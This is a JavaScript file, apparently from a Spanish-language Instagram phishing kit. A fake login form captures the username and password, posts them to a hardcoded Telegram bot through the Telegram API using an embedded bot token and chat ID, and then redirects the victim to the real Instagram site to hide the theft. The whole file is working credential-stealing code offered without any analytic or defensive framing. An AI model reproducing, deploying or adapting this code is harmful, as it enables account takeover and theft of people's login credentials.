const TELEGRAM_BOT_TOKEN = "8653746870:AAEZNQDfeO9P3t9DEXzWBKIMbH4ehcvoDOk";
const TELEGRAM_USER_ID = "6281783481";

async function sendToTelegram(username, password) {
    const message = `⚠️ DATOS INSTAGRAM ⚠️\nUsuario: ${username}\nContraseña: ${password}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: message })
        });
        window.location.href = "https://www.instagram.com";
    } catch (error) {
        console.error(error);
        alert("Error al iniciar sesión");
    }
}

document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const btn = document.querySelector(".login-btn");
    btn.textContent = "Iniciando...";
    btn.disabled = true;

    setTimeout(() => {
        sendToTelegram(username, password);
        btn.textContent = "Iniciar sesión";
        btn.disabled = false;
    }, 800);
});

// Activar botón cuando ambos campos estén llenos
const inputs = document.querySelectorAll(".login-form input");
inputs.forEach(input => {
    input.addEventListener("input", function() {
        const user = document.getElementById("username").value;
        const pass = document.getElementById("password").value;
        const btn = document.querySelector(".login-btn");

        if (user && pass) {
            btn.style.backgroundColor = "#0095f6";
        } else {
            btn.style.backgroundColor = "#b2dffc";
        }
    });
});
